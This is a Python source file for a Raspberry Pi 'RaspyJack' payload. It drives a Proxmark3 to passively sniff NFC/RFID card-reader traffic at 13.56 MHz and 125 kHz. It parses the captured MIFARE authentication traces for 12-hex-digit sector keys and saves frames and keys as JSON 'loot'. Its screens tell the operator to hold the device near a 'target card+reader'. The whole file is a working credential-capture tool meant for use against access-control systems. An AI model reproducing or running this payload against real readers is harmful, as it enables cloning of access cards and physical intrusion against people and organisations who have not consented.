#!/usr/bin/env python3
"""
RaspyJack Payload -- PM3 Sniffer
===================================
Passive NFC/RFID sniffing — capture card-reader communications
and extract keys. Requires Proxmark3.

Modes:
  HF         Sniff 13.56 MHz (ISO14443A / MIFARE)
  LF         Sniff 125 kHz (HID / EM4100 / Indala)

Controls:
  OK         Start / Stop sniff
  UP/DOWN    Scroll captured data
  KEY1       Switch HF / LF mode
  KEY2       Save capture
  KEY3       Exit
"""

import os
import sys
import re
import json
import time
from datetime import datetime

sys.path.append(os.path.abspath(os.path.join(__file__, "..", "..", "..")))

import RPi.GPIO as GPIO
import LCD_1in44
import LCD_Config
from PIL import Image
from payloads._display_helper import ScaledDraw, scaled_font
from payloads._input_helper import get_button
from payloads.nfc_rfid._nfc_driver import auto_detect, PM3Driver

PINS = {
    "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26,
    "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16,
}
WIDTH, HEIGHT = LCD_1in44.LCD_WIDTH, LCD_1in44.LCD_HEIGHT
LOOT_DIR = "/root/Raspyjack/loot/NFC/sniff"
DEBOUNCE = 0.18
_last_btn = 0

MODES = ["HF", "LF"]


def _btn():
    global _last_btn
    b = get_button(PINS, GPIO)
    now = time.time()
    if b and now - _last_btn < DEBOUNCE:
        return None
    if b:
        _last_btn = now
    return b


def _parse_hf_list(raw):
    """Parse 'hf mf list' output for auth traces and keys."""
    frames = []
    keys = []
    if not raw:
        return frames, keys
    for line in raw.split("\n"):
        stripped = line.strip()
        if not stripped or stripped.startswith("[") or stripped.startswith("#"):
            continue
        if "Auth" in stripped or "auth" in stripped:
            frames.append({"type": "auth", "raw": stripped[:60]})
        elif re.search(r"key\s*[:=]\s*([0-9A-Fa-f]{12})", stripped, re.IGNORECASE):
            m = re.search(r"key\s*[:=]\s*([0-9A-Fa-f]{12})", stripped, re.IGNORECASE)
            key_hex = m.group(1).upper()
            if key_hex not in keys:
                keys.append(key_hex)
            frames.append({"type": "key", "key": key_hex, "raw": stripped[:60]})
        elif re.search(r"\|\s*(Rd|Tag|Rdr)\s*\|", stripped):
            frames.append({"type": "data", "raw": stripped[:60]})

    # Also look for mfkey32/mfkey64 results
    for m in re.finditer(r"[Kk]ey\s*[AB]?\s*[:=]?\s*([0-9A-Fa-f]{12})", raw):
        key_hex = m.group(1).upper()
        if key_hex not in keys:
            keys.append(key_hex)

    return frames, keys


def _parse_lf_sniff(raw):
    """Parse 'lf sniff' and 'data samples' output for signal info."""
    frames = []
    if not raw:
        return frames
    for line in raw.split("\n"):
        stripped = line.strip()
        if not stripped or stripped.startswith("[=]"):
            continue
        if "samples" in stripped.lower() or "signal" in stripped.lower():
            frames.append({"type": "info", "raw": stripped[:60]})
        elif re.search(r"[0-9A-Fa-f]{8,}", stripped):
            frames.append({"type": "data", "raw": stripped[:60]})
    return frames


def _save_capture(mode, frames, keys):
    """Save sniff capture to JSON."""
    os.makedirs(LOOT_DIR, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fname = f"sniff_{mode}_{ts}.json"
    data = {
        "mode": mode,
        "timestamp": ts,
        "frames": frames[:200],
        "keys": keys,
        "frame_count": len(frames),
    }
    with open(os.path.join(LOOT_DIR, fname), "w") as f:
        json.dump(data, f, indent=2)
    return fname


def main():
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD_Config.GPIO_Init()
    lcd = LCD_1in44.LCD()
    lcd.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    lcd.LCD_Clear()

    font = scaled_font(10)
    font_sm = scaled_font(9)

    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ScaledDraw(img)
    d.text((4, 50), "Detecting reader...", font=font_sm, fill="#FFAA00")
    lcd.LCD_ShowImage(img, 0, 0)

    drv, drv_desc = auto_detect()

    if not isinstance(drv, PM3Driver):
        img = Image.new("RGB", (WIDTH, HEIGHT), "black")
        d = ScaledDraw(img)
        d.text((4, 40), "Requires PM3!", font=font, fill="#FF4444")
        d.text((4, 60), drv_desc[:22] if drv else "No reader", font=font_sm, fill="#888")
        d.text((4, 80), "Connect Proxmark3", font=font_sm, fill="#666")
        lcd.LCD_ShowImage(img, 0, 0)
        time.sleep(3)
        GPIO.cleanup()
        return 1

    mode_idx = 0
    status = drv_desc
    sniffing = False
    frames = []
    keys = []
    scroll = 0

    try:
        while True:
            btn = _btn()
            mode = MODES[mode_idx]

            if btn == "KEY3":
                break

            if btn == "KEY1" and not sniffing:
                mode_idx = (mode_idx + 1) % len(MODES)
                frames = []
                keys = []
                scroll = 0
                status = f"Mode: {MODES[mode_idx]}"

            if btn == "OK" and not sniffing:
                sniffing = True
                frames = []
                keys = []
                scroll = 0
                status = "Sniffing..."

                # Draw sniffing screen
                img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                d = ScaledDraw(img)
                d.rectangle((0, 0, 127, 14), fill="#1a0000")
                d.text((2, 2), f"SNIFF {mode}", font=font_sm, fill="#FF4444")
                d.text((4, 30), "Capturing...", font=font, fill="#FF4444")
                d.text((4, 50), "Place reader near", font=font_sm, fill="#FFAA00")
                d.text((4, 65), "target card+reader", font=font_sm, fill="#FFAA00")
                d.text((4, 90), "Wait 30 seconds", font=font_sm, fill="#888")
                lcd.LCD_ShowImage(img, 0, 0)

                if mode == "HF":
                    drv.command("hf 14a sniff -c -r", timeout=35)

                    # Decode captured traffic
                    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
                    d = ScaledDraw(img)
                    d.rectangle((0, 0, 127, 14), fill="#1a0000")
                    d.text((2, 2), "SNIFF HF", font=font_sm, fill="#FF4444")
                    d.text((4, 40), "Decoding...", font=font_sm, fill="#FFAA00")
                    lcd.LCD_ShowImage(img, 0, 0)

                    raw_list = drv.command("hf mf list", timeout=10)
                    frames, keys = _parse_hf_list(raw_list)

                    if keys:
                        status = f"{len(keys)} key(s) found!"
                    else:
                        status = f"{len(frames)} frames captured"
                else:
                    drv.command("lf sniff -v", timeout=35)

                    raw_list = drv.command("data samples", timeout=5)
                    frames = _parse_lf_sniff(raw_list)
                    status = f"{len(frames)} samples"

                sniffing = False

            if btn == "KEY2" and (frames or keys):
                fname = _save_capture(mode, frames, keys)
                status = f"Saved: {fname[:16]}"

            if btn == "UP":
                scroll = max(0, scroll - 1)
            elif btn == "DOWN":
                scroll += 1

            # --- Draw ---
            img = Image.new("RGB", (WIDTH, HEIGHT), "black")
            d = ScaledDraw(img)
            d.rectangle((0, 0, 127, 14), fill="#1a0000")
            d.text((2, 2), f"PM3 SNIFF", font=font_sm, fill="#FF4444")
            mode_col = "#00CCFF" if mode == "HF" else "#FFAA00"
            d.text((80, 2), mode, font=font_sm, fill=mode_col)

            y = 18
            d.text((2, y), status[:24], font=font_sm, fill="#FFAA00")
            y += 13

            if keys:
                d.text((2, y), f"Keys ({len(keys)}):", font=font_sm, fill="#00FF00")
                y += 12
                for k in keys[:3]:
                    d.text((4, y), k, font=font_sm, fill="#00FF00")
                    y += 11

            if frames:
                max_show = (105 - y) // 10
                visible = frames[scroll:scroll + max_show]
                for fr in visible:
                    col = "#00FF00" if fr["type"] == "key" else "#ccc" if fr["type"] == "auth" else "#888"
                    d.text((2, y), fr["raw"][:22], font=font_sm, fill=col)
                    y += 10
            elif not sniffing and not keys:
                d.text((4, 55), "Press OK to sniff", font=font_sm, fill="#666")
                d.text((4, 72), "K1:HF/LF mode", font=font_sm, fill="#888")

            d.rectangle((0, 116, 127, 127), fill="#111")
            d.text((2, 117), "OK:Sniff K1:Mode K2:Sav", font=font_sm, fill="#666")
            lcd.LCD_ShowImage(img, 0, 0)

            time.sleep(0.03)

    finally:
        if drv:
            drv.close()
        try:
            lcd.LCD_Clear()
        except Exception:
            pass
        GPIO.cleanup()

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
